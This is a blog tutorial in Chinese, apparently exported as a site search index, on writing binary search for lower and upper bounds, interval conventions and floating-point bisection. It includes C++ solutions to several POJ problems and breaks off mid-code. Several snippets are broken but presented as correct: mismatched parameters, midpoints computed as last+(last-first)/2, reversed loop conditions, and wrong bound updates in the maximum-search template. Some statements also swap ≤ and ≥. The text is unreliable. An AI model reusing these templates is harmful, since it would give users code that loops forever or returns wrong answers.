<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>二分查找</title>
    <url>/algorithm/binsearch/</url>
    <content><![CDATA[<p>二分查找版本众多，其中初始值的选择，判断条件，边界修改方式都有所不同。取整方式有向上取整和向下取整两种，区间开闭有左闭右开，左闭右闭，左开右闭，左闭右闭四种，再根据实际问题分为上界和下界两种，其中涉及细节繁多。在学习数据结构的时候讨论了不同版本平均查找长度和不同版本的正确性问题，但是仅限于三种版本，本文将讨论不同条件下二分查找的写法。</p>
<a id="more"></a>

<h1 id="求下界"><a href="#求下界" class="headerlink" title="求下界"></a>求下界</h1><blockquote>
<p>给定长度为$n$的单调不下降子序列$a_0,a_1,…,a_{n-1}$和一个数$k$,求满足$a_i\geq k$条件的最小的$i$</p>
</blockquote>
<p>挑战程序设计竞赛中给出的二分查找算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binsearch</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="comment">//初始化解存在的范围</span></span><br><span class="line">    <span class="keyword">int</span> lb=<span class="number">-1</span>,ub=n;</span><br><span class="line">    <span class="keyword">while</span>(ub-lb&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(lb+ub)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&gt;=k)&#123;</span><br><span class="line">            ub=mid;</span><br><span class="line">            <span class="comment">//解的范围变为(lb,mid]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            lb=mid;</span><br><span class="line">            <span class="comment">//解的范围变为(mid,ub]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>binsearch(int k)</code>在存在满足条件的$a_i$时返回对应数组下标的值，在不存在的时候返回$n$。</p>
<p>初始化解中$ub=n$，$n$不在数组下标索引范围内，用于在查找失败时候返回$n$。若序列$a_0,a_1,…,a_{n-1}$中不存在满足$a_i\geq k$的$i$，即$a_i&lt;k$对$i=0,1,..,n-1$均满足，每次迭代选择$lb=mid$分支，直到搜索区间缩减为$(n-1,n]$。</p>
<p>接下来讨论每次迭代时边界的修改，根据$a[mid]$与$k$的相对大小</p>
<ul>
<li><p>$a[mid]\geq k$,$mid$点满足$a[mid]\geq k$,所求为满足条件的最小下标，故大于$mid$的部分均可以舍去。在该情况下右边界可以取到，所以取$ub=mid$,此时解的范围为$(lb,mid]$</p>
</li>
<li><p>$a[mid]&lt;k$,$mid$不可能为解，左边界不可以取到，所以取$lb=mid$,此时解的范围为$(mid,ub]$</p>
<p>每次迭代的时候满足$a_i \geq k$的最小下标必然还存在于区间内</p>
</li>
</ul>
<p>循环在满足$ub-lb&gt;1$的时候执行，即在$ub-lb\leq1$的时候停止执行，$(lb，ub]$此时仅有$a[ub]$一个元素。若序列$a_0,a_1,…,a_{n-1}$存在满足$a_i\leq k$的$i$,则必然为$ub$,否则为$n$。</p>
<p>c++标准库中<algorithm>中<code>lower_bound()</code>等价于以下形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first=<span class="number">0</span>,last=n;</span><br><span class="line">    <span class="comment">//区间为[0,n)</span></span><br><span class="line">    <span class="keyword">while</span>(first&lt;last)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=first+(last-first)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&gt;=k)&#123;</span><br><span class="line">            last=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            first=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>lower_bound()</code>在序列$a_0,a_1,…,a_{n-1}$存在满足$a_i\leq k$的$i$时返回$n$。</p>
<p>这里的mid写法和挑战程序设计竞赛上不一样，防止了在相加时的溢出问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mid&#x3D;(first+last)&#x2F;2&#x3D;(2*first+last-first)&#x2F;2&#x3D;first+length&#x2F;2</span><br></pre></td></tr></table></figure>
<p>二者在算术意义上是等价的。</p>
<p>将问题中的$\geq$更改为$&gt;$，得到以下问题：</p>
<blockquote>
<p>给定长度为$n$的单调不下降子序列$a_0,a_1,…,a_{n-1}$和一个数$k$,求满足$a_i&gt; k$条件的最小的$i$</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upper_bound</span><span class="params">(<span class="keyword">int</span> first,<span class="keyword">int</span> last,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first=<span class="number">0</span>,last=n;</span><br><span class="line">    <span class="comment">//区间为[0,n)</span></span><br><span class="line">    <span class="keyword">while</span>(first&lt;last)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=first+(last-first)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&gt;k)&#123;</span><br><span class="line">            last=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            first=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与<code>lower_bound()</code>类似，<code>upper_bound()</code>在序列$a_0,a_1,…,a_{n-1}$不存在满足$a_i &lt;k$的$i$时返回$n$。</p>
<p>实际算法题往往是求满足条件的最小值，一般用以下形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int search(int low, int high) &#123;</span><br><span class="line">  int ans &#x3D; -1;</span><br><span class="line">  while (low &lt;&#x3D; high) &#123;</span><br><span class="line">    int mid &#x3D; low + (high - low) &#x2F; 2;</span><br><span class="line">    if (judge(mid)) &#123;</span><br><span class="line">      ans &#x3D; mid;</span><br><span class="line">      high &#x3D; mid - 1;</span><br><span class="line">    &#125; else low &#x3D; mid + 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>judge()</code>判断取值为mid的时候是否满足条件，用临时变量ans记录备选结果，随着区间的不断减小，满足条件的备选方案也会不断调整，最后ans表示想要找的结果。</p>
<p><a href="http://poj.org/problem?id=3273">POJ 3273</a></p>
<p>最小化最大值，也就是求下界问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Inf=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>,len=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum+a[i]&lt;=d)&#123;</span><br><span class="line">            sum+=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            sum=a[i];</span><br><span class="line">            len++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len&gt;m) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m)==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> low=<span class="number">0</span>,high=Inf;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">            low=max(low,a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid=low+(high-low)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(mid))&#123;</span><br><span class="line">                high=mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                low=mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>,len=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum+a[i]&lt;=d)&#123;</span><br><span class="line">            sum+=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            sum=a[i];</span><br><span class="line">            len++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len&gt;m) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m)==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> low=<span class="number">0</span>,high=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">            high+=a[i];</span><br><span class="line">            low=max(low,a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(high&gt;=low)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(mid))&#123;</span><br><span class="line">                high=mid<span class="number">-1</span>;</span><br><span class="line">                ans=mid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                low=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="求上界"><a href="#求上界" class="headerlink" title="求上界"></a>求上界</h1><blockquote>
<p>给定长度为$n$的单调不下降子序列$a_0,a_1,…,a_{n-1}$和一个数$k$,求满足$a_i \leq k$条件的最大的$i$</p>
</blockquote>
<p>该问题可以转化为求下界问题，满足$a_i&gt;k$条件最小的$i$再减去1即是满足$a_i \leq k$条件的最大的$i$。</p>
<p>也可以写作以下形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first=<span class="number">0</span>,last=n;</span><br><span class="line">    <span class="comment">//区间为[first,last)</span></span><br><span class="line">    <span class="keyword">while</span>(last-first&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=last+(last-first)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&lt;=k)&#123;</span><br><span class="line">            first=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            last=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first=<span class="number">0</span>,last=n;</span><br><span class="line">    <span class="comment">//区间为[first,last)</span></span><br><span class="line">    <span class="keyword">while</span>(first&lt;last)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=last+(last-first)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&lt;=k)&#123;</span><br><span class="line">            first=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            last=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考虑迭代过程，根据$a[mid]$与$k$的相对大小</p>
<ul>
<li><p>$a[mid]\leq k$,$mid$点满足$a[mid]\geq k$,所求为满足条件的最大下标，故小于$mid$的部分均可以舍去。左端点可以取到，故取$first=mid$，此解的范围为$[mid,last)$</p>
</li>
<li><p>$a[mid]&gt;k$,$mid$不可能为解，右边界不可以取到，所以取$last=mid$,此时解的范围为$[first,last)$</p>
<p>每次迭代的时候满足$a_i\leq k$的最大下标必然还存在于区间内</p>
</li>
</ul>
<p>循环在满足$first-last \geq1$的时候执行，即在$first==last$的时候停止执行，$(first，last]$此时为空。</p>
<blockquote>
<p>给定长度为$n$的单调不下降子序列$a_0,a_1,…,a_{n-1}$和一个数$k$,求满足$a_i &lt; k$条件的最大的$i$</p>
</blockquote>
<p>该问题同样可以转化为求下界问题，满足$ a_i \leq k$条件最小的$i$再减去1即是满足$ a_i &lt; k$条件的最大的$i$。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first=<span class="number">0</span>,last=n;</span><br><span class="line">    <span class="comment">//区间为[first,last)</span></span><br><span class="line">    <span class="keyword">while</span>(first-last&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=last-(last-first)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&lt;k)&#123;</span><br><span class="line">            first=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            last=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lower_bound</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first=<span class="number">0</span>,last=n;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">////区间为[first,last)</span></span><br><span class="line">    <span class="keyword">while</span>(first&lt;=last)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=first+(last-first)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[mid]&lt;=k)&#123;</span><br><span class="line">            first=mid<span class="number">-1</span>;</span><br><span class="line">            ans=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            last=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在求满足条件的最大值往往用以下形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">    <span class="keyword">int</span> mid = low + (high - low) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (judge(mid)) &#123;</span><br><span class="line">      ans = mid;</span><br><span class="line">      low = mid - <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> high = mid + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上形式便于在找不到符合条件的解时返回-1</p>
<p><a href="http://poj.org/problem?id=2456">POJ 2456</a></p>
<p>最大化最小值，也就是求上界问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Inf=<span class="number">1e9</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> n,c;</span><br><span class="line"><span class="keyword">int</span> x[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> last=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;c;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> crt=last+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(crt&lt;n&amp;&amp;x[crt]-x[last]&lt;d)&#123;</span><br><span class="line">            crt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(crt==n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        last=crt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;c);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(x,x+n);</span><br><span class="line">    <span class="keyword">int</span> lb=<span class="number">1</span>,ub=Inf;</span><br><span class="line">    <span class="keyword">while</span>(ub-lb&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=lb+(ub-lb)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(check(mid))&#123;</span><br><span class="line">            lb=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ub=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,lb);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Inf=<span class="number">1e9</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> n,c;</span><br><span class="line"><span class="keyword">int</span> x[maxn];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> last=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;c;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> crt=last+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(crt&lt;n&amp;&amp;x[crt]-x[last]&lt;d)&#123;</span><br><span class="line">            crt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(crt==n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        last=crt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;c);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(x,x+n);</span><br><span class="line">    <span class="keyword">int</span> lb=<span class="number">1</span>,ub=Inf;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(lb&lt;=ub)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=lb+(ub-lb)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(check(mid))&#123;</span><br><span class="line">            ans=mid;</span><br><span class="line">            lb=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ub=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="区间问题"><a href="#区间问题" class="headerlink" title="区间问题"></a>区间问题</h1><p>区间中点的选择并不唯一</p>
<ol>
<li>上位中位数：<code>uppermid=first+length/2</code></li>
<li>下位中位数：<code>lowermid=first+(length-1)/2</code></li>
</ol>
<p>在<code>length</code>为偶数时二者取值才不同，分别为中间一对下标中的大者和小者。</p>
<p>区间中点选择上位中位数还是下位中位数差异不大，其余部分不需要跟着调整。</p>
<p>若区间取两端为闭区间时，循环条件应为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(lb&lt;&#x3D;ub)</span><br></pre></td></tr></table></figure>
<p>若区间一端为开区间，一端为闭区间，循环条件应为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(lb&lt;ub)</span><br></pre></td></tr></table></figure>
<p>若区间两端均为开区间，循环条件应为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(ub-lb&lt;1)</span><br></pre></td></tr></table></figure>
<p>二分思想是利用区间值有序的特点，不断让区间长度减半，最后将区间长度缩小至0或1。</p>
<p>确保二分的正确性，</p>
<ol>
<li>每次迭代解均在可行区间内</li>
<li>每次判断后可行区间都会缩小</li>
</ol>
<p>在区间为1的时候，左右端点值处理不好就会存在死循环。</p>
<h1 id="浮点数二分"><a href="#浮点数二分" class="headerlink" title="浮点数二分"></a>浮点数二分</h1><p>浮点数二分循环条件一般为要求达到的精度或者迭代次数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eps 1e-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">search</span><span class="params">(<span class="keyword">double</span> low, <span class="keyword">double</span> high)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (high - low &gt; eps) &#123;</span><br><span class="line">    <span class="keyword">double</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (judge(mid)) high = mid;</span><br><span class="line">    <span class="keyword">else</span> low = mid;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (low + high) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://poj.org/problem?id=1064">POJ 1064</a></p>
<p>给$n$条绳子，长度分别为$l_i$,从中切分出$k$条长度相同的绳子，这$k$条绳子最长有多长？</p>
<p>设条件$C(x)=$可以得到$k$条满足长度要求的绳子</p>
<p>问题转变为了求满足$C(x)$条件的最大的$x$</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">10005</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> Inf=<span class="number">100005.0</span>;</span><br><span class="line"><span class="keyword">double</span> l[maxn];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span 